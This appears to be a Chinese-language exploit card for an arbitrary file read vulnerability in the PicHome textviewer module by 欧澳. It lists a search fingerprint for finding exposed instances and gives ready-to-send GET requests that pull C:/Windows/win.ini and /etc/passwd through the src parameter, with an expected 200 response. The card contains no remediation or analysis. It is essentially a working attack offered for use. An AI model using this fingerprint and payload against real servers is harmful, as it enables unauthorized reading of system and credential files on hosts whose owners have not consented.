# 欧澳PicHometextviewer存在任意文件读取漏洞

- **系统**：欧澳　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="欧澳图文-欧澳PicHome"`
- **请求**：`GET /index.php?mod=textviewer&op=index&src=C:/Windows/win.ini HTTP/1.1`

**请求体 / payload**
```
GET /index.php?mod=textviewer&op=index&src=/etc/passwd HTTP/1.1
Host:
```
- **预期**：200　|　—